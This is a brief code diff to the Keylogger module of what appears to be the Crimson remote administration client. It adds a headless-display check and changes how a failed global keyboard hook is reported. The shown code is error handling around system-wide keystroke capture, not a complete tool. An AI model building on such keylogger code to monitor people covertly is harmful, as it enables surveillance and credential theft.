@@ -17,6 +17,8 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.modules;
 
+import java.awt.GraphicsEnvironment;
+import java.awt.HeadlessException;
 import java.util.ArrayList;
 
 import org.jnativehook.GlobalScreen;
@@ -42,7 +44,11 @@ public enum Keylogger {
 
 	public static FLUSH_METHOD method;
 
-	public static void start(FLUSH_METHOD m, int value) {
+	public static void start(FLUSH_METHOD m, int value) throws HeadlessException, NativeHookException {
+		if (GraphicsEnvironment.isHeadless()) {
+			throw new HeadlessException();
+		}
+
 		method = m;
 
 		stop();
@@ -85,9 +91,8 @@ public enum Keylogger {
 			GlobalScreen.registerNativeHook();
 			GlobalScreen.addNativeKeyListener(new NKL());
 		} catch (NativeHookException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
 			stop();
+			throw e;
 		}
 
 	}
